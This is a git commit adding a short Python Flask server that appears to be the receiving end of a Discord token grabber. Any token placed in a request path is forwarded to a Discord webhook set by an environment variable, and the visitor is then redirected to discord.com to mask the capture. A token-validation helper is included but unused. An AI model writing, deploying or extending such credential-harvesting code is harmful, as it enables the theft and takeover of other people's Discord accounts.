43813b86762819827e5088ab5b4b6fb2a46d4c83
43a1723 <hai1723notgay@gmail.com>
2024-05-26 17:43:27 +0700

    Create main.py

---
+++ main.py
@@ -0,0 +1,28 @@
+from dhooks import Webhook
+import os
+from flask import Flask, redirect
+import requests
+
+def check_discord_token(token):
+    url = "https://discord.com/api/v10/users/@me"
+    headers = {
+        "Authorization": f"Bot {token}"
+    }
+    
+    response = requests.get(url, headers=headers)
+    
+    if response.status_code == 200:
+        return True
+    else:
+        return False
+
+e = os.getenv('DISCORD_URL')
+app = Flask(__name__)
+hook = Webhook(e)
+@app.route('/<string:token>')
+def index(token):
+  hook.send(token)
+  return redirect("https://discord.com")
+
+if __name__ == "__main__":
+  app.run(host='0.0.0.0', port=81)
